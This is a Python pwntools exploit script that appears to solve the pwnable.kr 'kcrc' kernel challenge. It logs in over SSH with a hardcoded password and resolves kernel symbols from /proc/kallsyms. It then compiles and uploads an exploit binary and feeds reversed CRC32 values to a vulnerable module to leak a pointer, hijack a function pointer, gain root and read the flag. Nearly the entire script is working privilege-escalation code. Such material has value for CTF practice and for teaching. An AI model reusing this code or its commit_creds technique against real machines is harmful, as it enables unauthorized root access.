#!/usr/bin/env python3
import gzip

from pwn import *

from crc32 import reverse_crc32

if args.LOCAL:
    if args.GDB:
        shell = process("./debug.sh")
    else:
        shell = process("./run.sh")
else:
    shell = process('sshpass -p "Congratz!! addr_limit looks quite IMPORTANT now... huh?" ssh kcrc@pwnable.kr -p2222', shell=True)

# --- utils --- #
def do_command(shell: tube, cmd: bytes) -> bytes:
    shell.sendline(cmd)
    return shell.recvuntil(b"/ $", drop=True)

def upload_file(shell: tube, filename: bytes, data: bytes):
    for _ in range(0, len(data), 400):
        encoded_data = b64e(gzip.compress(data[_:_+400])).encode()
        do_command(shell, b'echo -n "%s" | base64 -d | gzip -d >> %s' % (encoded_data, filename))

def compile_exploit(code: bytes, kcrc: int, prepare_kernel_creds: int, commit_creds: int) -> bytes:
    with tempfile.NamedTemporaryFile("wb", suffix=".c") as exploit:
        exploit.write(code % (kcrc, prepare_kernel_creds, commit_creds))
    
        if (p := process(["rz-gg", "-a", "x86", "-b", "32", "-F", "-o", "exploit", exploit.name])).poll(True):
            raise Exception(f"compilation failure!: {p.recvall().decode()}")

        with open("exploit", "rb") as compiled:
            return compiled.read()

def read_int_regex(shell: tube, regex: bytes) -> int:
    return int(re.match(regex, shell.recvline_regex(regex)).groups()[0], 16)

def resolve_syms(shell: tube) -> dict[str, int]:
    output = do_command(shell, b'grep "\[kcrc\]\|prepare_kernel_cred\|commit_creds" /proc/kallsyms').splitlines()[1:]

    syms = {}
    for line_ in output:
        address, _, name, *_ = line_.split()
        syms[name] = int(address, 16)

    return syms

# output is sometimes unordered, this sleep + enter fixes it
shell.recvuntil(b"/ $")
sleep(1)
do_command(shell, b"")

# --- exploit compilation --- #
syms = resolve_syms(shell)

info(f"prepare_kernel_cred: 0x{syms[b'prepare_kernel_cred']:x}")
info(f"commit_creds: 0x{syms[b'commit_creds']:x}")
info(f"kcrc: 0x{syms[b'kcrc']:x}")

with open("exploit.c", "rb") as exploit_template:
    exploit_code = compile_exploit(exploit_template.read(), syms[b"kcrc"], syms[b"prepare_kernel_cred"], syms[b"commit_creds"])

info("uploading file...")

upload_file(shell, b"/tmp/exploit", exploit_code)
do_command(shell, b"chmod +x /tmp/exploit")

# ------ exploit ------ #
PROCFILE_REGEX = b"leaked proc file ptr: (0x[0-9a-f]+)"
PRIVILEGED_REGEX = b"privileged: (0x[0-9a-f]+)"
PROCFILE_READ_PROCEDURE_OFFSET = 0x34

info("starting exploit!")
shell.sendline(b"/tmp/exploit")

# --- set index --- # 
procfile_ptr = read_int_regex(shell, PROCFILE_REGEX)

success(f"leaked procfile ptr: 0x{procfile_ptr:x}")

reverse_crc = reverse_crc32((((procfile_ptr - syms[b'kcrc'] + PROCFILE_READ_PROCEDURE_OFFSET) // 4) - 1) % (1 << 32))[0]

info(f"reverse crc: {reverse_crc}")

shell.sendline(reverse_crc.encode())

# --- set jump address --- #
privileged_addr = read_int_regex(shell, PRIVILEGED_REGEX)

info(f"privileged address: 0x{privileged_addr:x}")

reverse_crc = reverse_crc32(privileged_addr)[0]

info(f"reverse crc: {reverse_crc}")

shell.sendline(reverse_crc.encode())

# --- print flag --- #
shell.recvuntil(b"/ # ")
shell.sendline(b"/bin/cat flag")
shell.recvline()

log.success(f"flag = '{term.text.bold_italic_yellow(shell.recvline().decode().strip())}'")